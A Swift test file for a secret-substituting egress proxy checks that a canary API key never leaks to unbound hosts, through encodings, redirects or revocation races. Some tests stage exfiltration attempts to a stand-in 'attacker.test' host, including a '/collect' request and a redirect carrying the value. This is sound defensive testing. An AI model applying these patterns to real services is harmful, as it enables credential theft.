import BelloCore
import Foundation
import Synchronization
import Testing

@testable import SecretKit

/// The egress proxy in-process: loopback TLS servers stand for the bound API and an attacker, a stand-in gateway sends
/// the scope preamble, and URLSession is the client (trusting the proxy's CA like a workspace container does).
@Suite("Egress proxy (in-process)", .serialized, .timeLimit(.minutes(3)))
struct ProxyTests {
    static let canary = "sk_live_CANARY_\(UUID().uuidString.replacingOccurrences(of: "-", with: ""))"

    /// Any detectable form of the canary (raw, encoded, partially escaped).
    static func leaked(_ data: Data) -> Bool { !SecretPatterns(value: Data(canary.utf8)).forms(in: data).isEmpty }

    struct Fixture {
        let proxyCA: CertificateAuthority
        let serverCA: CertificateAuthority
        let proxy: EgressProxy
        let bound: EchoServer
        let attacker: EchoServer
        let gateway: TestGateway
        let client: ProxyClient
        let placeholder: String
        let secret: ManagedSecret

        func stop() {
            proxy.stop()
            bound.stop()
            attacker.stop()
            gateway.stop()
            client.session.invalidateAndCancel()
        }

        /// The canary must not appear in anything the client saw.
        func expectClean(_ status: Int, _ headers: [String: String], _ body: Data, sourceLocation: SourceLocation = #_sourceLocation) {
            let seen = Data((headers.map { "\($0.key): \($0.value)" }.joined(separator: "\n")).utf8) + body
            #expect(!SecretPatterns(value: Data(ProxyTests.canary.utf8)).forms(in: seen).contains(.raw), sourceLocation: sourceLocation)
            #expect(SecretPatterns(value: Data(ProxyTests.canary.utf8)).forms(in: seen).isEmpty, "status \(status)", sourceLocation: sourceLocation)
        }
    }

    static func makeFixture(binding: SecretBinding? = nil, router: (any EgressRouter)? = nil) async throws -> Fixture {
        let proxyCA = try CertificateAuthority(commonName: "Test egress CA")
        let serverCA = try CertificateAuthority(commonName: "Test servers CA")
        let bound = try await EchoServer(name: "bound.test", authority: serverCA)
        let attacker = try await EchoServer(name: "attacker.test", authority: serverCA)
        let proxy = EgressProxy(authority: proxyCA, configuration: EgressProxyConfiguration(
            extraAnchors: [serverCA.certificateDER],
            resolverOverrides: ["bound.test": HostPort(host: "127.0.0.1", port: Int(bound.port)),
                                "attacker.test": HostPort(host: "127.0.0.1", port: Int(attacker.port))],
            inspectedResponseTime: .seconds(3), router: router ?? InternetRouter()))
        let proxyPort = try await proxy.start()
        let token = UUID().uuidString
        proxy.setScopes([EgressScope(id: "test", token: token) { $0 == "/project" }])
        let binding = binding ?? SecretBinding(host: "bound.test", methods: ["GET", "POST"], pathPrefixes: ["/v1"],
                                               locations: [.header("Authorization", prefix: "Bearer ")])
        let secret = ManagedSecret(account: "bcs_canary", name: "API_KEY", label: "Canary key", mode: .placeholder, bindings: [binding])
        let placeholder = Placeholder.make()
        proxy.update(EgressSnapshot(
            grants: [placeholder: PlaceholderGrant(placeholder: placeholder, account: secret.account, sessionID: "ses_test", projectDirectory: "/project")],
            secrets: [secret.account: secret], values: [secret.account: SecretValue(canary)]))
        let gateway = try await TestGateway(proxyPort: proxyPort, token: token)
        let client = ProxyClient(gatewayPort: gateway.port, anchor: proxyCA.certificateDER)
        return Fixture(proxyCA: proxyCA, serverCA: serverCA, proxy: proxy, bound: bound, attacker: attacker, gateway: gateway,
                       client: client, placeholder: placeholder, secret: secret)
    }

    @Test func boundRequestIsSubstitutedAndReflectionRedacted() async throws {
        let f = try await Self.makeFixture()
        defer { f.stop() }
        let (status, headers, body) = try await f.client.get("https://bound.test/v1/echo", headers: ["Authorization": "Bearer \(f.placeholder)"])
        #expect(status == 200)
        #expect(ByteSearch.contains(f.bound.receivedBytes, Data(Self.canary.utf8)), "the bound server got the real value")
        #expect(String(decoding: body, as: UTF8.self).contains("Bearer \(f.placeholder)"), "the echo shows the placeholder")
        f.expectClean(status, headers, body)
    }

    @Test func everyReflectionEncodingIsRedactedOrBlocked() async throws {
        let f = try await Self.makeFixture()
        defer { f.stop() }
        for encoding in ["raw", "gzip", "deflate", "br", "zstd", "chunked", "split", "base64", "hex", "url", "json", "header", "location", "close"] {
            let (status, headers, body) = try await f.client.get("https://bound.test/v1/echo?enc=\(encoding)",
                                                                  headers: ["Authorization": "Bearer \(f.placeholder)"])
            f.expectClean(status, headers, body)
            if ["base64", "hex", "zstd"].contains(encoding) { #expect(status == 502, "\(encoding) should be blocked") }
        }
        #expect(!Self.leaked(f.attacker.receivedBytes), "the attacker received the canary")
    }

    /// AF15: the owner revokes the secret while the upstream connection is still being set up (after the substitution
    /// was decided). The revocation wins: the request is refused and the retained value is never sent.
    @Test func aRevocationDuringConnectionSetupRefusesTheRetainedValue() async throws {
        let router = HeldRouter()
        let f = try await Self.makeFixture(router: router)
        defer { router.release(); f.stop() }
        let request = Task { try await f.client.get("https://bound.test/v1/echo", headers: ["Authorization": "Bearer \(f.placeholder)"]) }
        await router.waitUntilHeld()
        // What SecretManager publishes for a revoked secret: neither it nor its grants are in the snapshot any more.
        f.proxy.update(EgressSnapshot())
        router.release()
        let (status, headers, body) = try await request.value
        #expect(status == 403, "sent after the revocation")
        #expect(!Self.leaked(f.bound.receivedBytes), "the retained value reached the destination after the revocation")
        #expect(f.proxy.ledger.count(account: f.secret.account, bindingID: f.secret.bindings[0].id) == 0, "nothing sent: the use is given back")
        f.expectClean(status, headers, body)
    }

    @Test func unboundAndAttackerPathsAreRefused() async throws {
        let f = try await Self.makeFixture()
        defer { f.stop() }
        let attempts: [(String, [String: String])] = [
            ("https://attacker.test/collect", ["Authorization": "Bearer \(f.placeholder)"]),
            ("https://bound.test/v2/echo", ["Authorization": "Bearer \(f.placeholder)"]),
            ("https://bound.test/v1/../echo", ["Authorization": "Bearer \(f.placeholder)"]),
            ("https://bound.test/v1/echo", ["X-Other": f.placeholder]),
            ("https://bound.test/v1/echo?k=\(f.placeholder)", [:]),
            ("http://bound.test/v1/echo", ["Authorization": "Bearer \(f.placeholder)"]),
        ]
        for (url, headers) in attempts {
            let (status, responseHeaders, body) = try await f.client.get(url, headers: headers)
            #expect(status == 403 || status == 502, "\(url) → \(status)")
            f.expectClean(status, responseHeaders, body)
        }
        #expect(f.attacker.requestCount == 0, "nothing carrying a placeholder reaches an unbound host")
        #expect(!Self.leaked(f.bound.receivedBytes))
    }

    @Test func redirectsNeverCarryTheValue() async throws {
        let f = try await Self.makeFixture()
        defer { f.stop() }
        // The bound server redirects to the attacker with the value in the URL; the client follows with the placeholder.
        let (status, headers, body) = try await f.client.get("https://bound.test/v1/echo?enc=location", headers: ["Authorization": "Bearer \(f.placeholder)"])
        f.expectClean(status, headers, body)
        let (s2, h2, b2) = try await f.client.get("https://bound.test/v1/redirect?to=https://attacker.test/x", headers: ["Authorization": "Bearer \(f.placeholder)"])
        f.expectClean(s2, h2, b2)
        #expect(!Self.leaked(f.attacker.receivedBytes), "the attacker received the canary")
    }

    @Test func streamingFromBoundDestinationIsCutAndUnboundStreams() async throws {
        let f = try await Self.makeFixture()
        defer { f.stop() }
        let (status, _, body) = try await f.client.get("https://bound.test/v1/stream", headers: ["Authorization": "Bearer \(f.placeholder)"])
        #expect(status == 502)
        #expect(String(decoding: body, as: UTF8.self).contains("did not finish"))
        // An unbound destination streams through without inspection (no secret can be in it).
        let (s2, _, b2) = try await f.client.get("https://attacker.test/big?mb=8")
        #expect(s2 == 200 && b2.count == 8 << 20)
    }

    @Test func connectionsWithoutTheGatewayTokenAreRefused() async throws {
        let f = try await Self.makeFixture()
        defer { f.stop() }
        let wrong = try await TestGateway(proxyPort: f.proxy.port!, token: "not-the-token")
        defer { wrong.stop() }
        let client = ProxyClient(gatewayPort: wrong.port, anchor: f.proxyCA.certificateDER)
        defer { client.session.invalidateAndCancel() }
        await #expect(throws: (any Error).self) { _ = try await client.get("https://bound.test/v1/echo", headers: ["Authorization": "Bearer \(f.placeholder)"]) }
        #expect(f.bound.requestCount == 0)
    }

    @Test func useLimitsAndSubstitutionEvents() async throws {
        let f = try await Self.makeFixture(binding: SecretBinding(host: "bound.test", pathPrefixes: ["/v1"], locations: [.header("Authorization", prefix: "Bearer ")], maxUses: 1))
        defer { f.stop() }
        var events = f.proxy.events.makeAsyncIterator()
        let (first, _, _) = try await f.client.get("https://bound.test/v1/ok", headers: ["Authorization": "Bearer \(f.placeholder)"])
        let (second, _, _) = try await f.client.get("https://bound.test/v1/ok", headers: ["Authorization": "Bearer \(f.placeholder)"])
        #expect(first == 200 && second == 403)
        guard case .substituted(let use, _, _, let code)? = await events.next() else { Issue.record("no substitution event"); return }
        #expect(use.account == "bcs_canary" && code == 200)
        guard case .refused(.useLimit, _, _, _, _)? = await events.next() else { Issue.record("no refusal event"); return }
    }

    /// R13: the secret's current scope must admit the grant's project at substitution, even if a stale grant survives.
    @Test func grantOutsideTheCurrentScopeIsRefused() async throws {
        let f = try await Self.makeFixture()
        defer { f.stop() }
        var narrowed = f.secret
        narrowed.scope = .project("/elsewhere")
        f.proxy.update(EgressSnapshot(
            grants: [f.placeholder: PlaceholderGrant(placeholder: f.placeholder, account: f.secret.account, sessionID: "ses_test", projectDirectory: "/project")],
            secrets: [f.secret.account: narrowed], values: [f.secret.account: SecretValue(Self.canary)]))
        let (status, headers, body) = try await f.client.get("https://bound.test/v1/ok", headers: ["Authorization": "Bearer \(f.placeholder)"])
        #expect(status == 403 && headers["X-BelloCode-Refused"] == SecretRefusal.wrongProject(label: "").code, "\(status) \(headers)")
        f.expectClean(status, headers, body)
        #expect(!ByteSearch.contains(f.bound.receivedBytes, Data(Self.canary.utf8)))
    }

    /// R12: a limited binding's use is recorded durably before the request leaves; if it cannot be, nothing is sent.
    @Test func limitedUseThatCannotBeRecordedIsRefused() async throws {
        let f = try await Self.makeFixture(binding: SecretBinding(host: "bound.test", pathPrefixes: ["/v1"], locations: [.header("Authorization", prefix: "Bearer ")], maxUses: 5))
        defer { f.stop() }
        let recorded = Mutex<[SubstitutionUse]>([])
        f.proxy.setUseRecorder { uses in recorded.withLock { $0 += uses }; return false }
        let (status, _, _) = try await f.client.get("https://bound.test/v1/ok", headers: ["Authorization": "Bearer \(f.placeholder)"])
        #expect(status == 403)
        #expect(recorded.withLock { $0.map(\.bindingID) } == [f.secret.bindings[0].id])
        #expect(!ByteSearch.contains(f.bound.receivedBytes, Data(Self.canary.utf8)), "nothing was sent")
        f.proxy.setUseRecorder { _ in true }
        let (ok, _, _) = try await f.client.get("https://bound.test/v1/ok", headers: ["Authorization": "Bearer \(f.placeholder)"])
        #expect(ok == 200)
        #expect(f.proxy.ledger.count(account: f.secret.account, bindingID: f.secret.bindings[0].id) == 2, "both reservations count")
    }
}

/// The routing step (docs/features/secrets.md "Routing"): private `.bc` names go where the router says, unknown ones are
/// refused, and secret substitution is the same whatever the route or the client scope.
@Suite("Egress routing (in-process)", .serialized, .timeLimit(.minutes(2)))
struct RoutingTests {
    @Test func routedNamesSubstitutionAndClientIndependence() async throws {
        let serverCA = try CertificateAuthority(commonName: "Routing servers CA")
        let bound = try await EchoServer(name: "bound.test", authority: serverCA)
        let devServer = try await EchoServer(name: "dev", authority: nil)
        defer { bound.stop(); devServer.stop() }
        let devPort = Int(devServer.port)
        let router = SuffixRouter { destination, _ in
            destination == HostPort(host: "web.proj.bc", port: 5173) ? .dial(EgressDial(endpoint: HostPort(host: "127.0.0.1", port: devPort))) : nil
        }
        let proxyCA = try CertificateAuthority(commonName: "Routing egress CA")
        let proxy = EgressProxy(authority: proxyCA, configuration: EgressProxyConfiguration(
            extraAnchors: [serverCA.certificateDER],
            resolverOverrides: ["bound.test": HostPort(host: "127.0.0.1", port: Int(bound.port))], router: router))
        let port = try await proxy.start()
        defer { proxy.stop() }
        // Two clients: a workspace scope (one project) and a browser scope (any project), same snapshot.
        proxy.setScopes([EgressScope(id: "workspace", token: "ws-token") { $0 == "/project" },
                         EgressScope(id: "browser", token: "browser-token") { _ in true }])
        let secret = ManagedSecret(account: "bcs_r", name: "K", label: "Key", mode: .placeholder,
                                   bindings: [SecretBinding(host: "bound.test", pathPrefixes: ["/v1"], locations: [.header("Authorization", prefix: "Bearer ")])])
        let placeholder = Placeholder.make()
        proxy.update(EgressSnapshot(
            grants: [placeholder: PlaceholderGrant(placeholder: placeholder, account: secret.account, sessionID: "s", projectDirectory: "/project")],
            secrets: [secret.account: secret], values: [secret.account: SecretValue(ProxyTests.canary)]))
        for token in ["ws-token", "browser-token"] {
            let gateway = try await TestGateway(proxyPort: port, token: token)
            let client = ProxyClient(gatewayPort: gateway.port, anchor: proxyCA.certificateDER)
            defer { gateway.stop(); client.session.invalidateAndCancel() }
            let (routed, _, body) = try await client.get("http://web.proj.bc:5173/hello")
            #expect(routed == 200 && String(decoding: body, as: UTF8.self) == "ok\n", "\(token): routed dev server")
            let (unknown, _, _) = try await client.get("http://other.proj.bc:5173/")
            #expect(unknown == 403, "\(token): unknown private name refused")
            let (unbound, _, _) = try await client.get("http://web.proj.bc:5173/x", headers: ["Authorization": "Bearer \(placeholder)"])
            #expect(unbound == 403, "\(token): a placeholder to a routed name is refused like any unbound destination")
            let (substituted, headers, echoed) = try await client.get("https://bound.test/v1/echo", headers: ["Authorization": "Bearer \(placeholder)"])
            #expect(substituted == 200, "\(token): bound destination")
            #expect(!ProxyTests.leaked(Data((headers.description).utf8) + echoed))
        }
        #expect(!ProxyTests.leaked(devServer.receivedBytes), "the routed server never received the value")
        #expect(ByteSearch.count(bound.receivedBytes, Data(ProxyTests.canary.utf8)) == 2, "both clients' requests were substituted")
    }
}

/// Holds every route decision (the start of an upstream connection) until released.
final class HeldRouter: EgressRouter, Sendable {
    private struct State {
        var held = false
        var heldWaiters: [CheckedContinuation<Void, Never>] = []
        var released = false
        var releaseWaiters: [CheckedContinuation<Void, Never>] = []
    }

    private let state = Mutex(State())

    func route(scheme: String, destination: HostPort, scope: String) async -> EgressRoute {
        let waiting = state.withLock { state -> [CheckedContinuation<Void, Never>] in
            state.held = true
            defer { state.heldWaiters = [] }
            return state.heldWaiters
        }
        waiting.forEach { $0.resume() }
        await withCheckedContinuation { continuation in
            let go = state.withLock { state -> Bool in
                if state.released { return true }
                state.releaseWaiters.append(continuation)
                return false
            }
            if go { continuation.resume() }
        }
        return .internet
    }

    func waitUntilHeld() async {
        await withCheckedContinuation { continuation in
            let now = state.withLock { state -> Bool in
                if state.held { return true }
                state.heldWaiters.append(continuation)
                return false
            }
            if now { continuation.resume() }
        }
    }

    func release() {
        let waiters = state.withLock { state -> [CheckedContinuation<Void, Never>] in
            state.released = true
            defer { state.releaseWaiters = [] }
            return state.releaseWaiters
        }
        waiters.forEach { $0.resume() }
    }
}
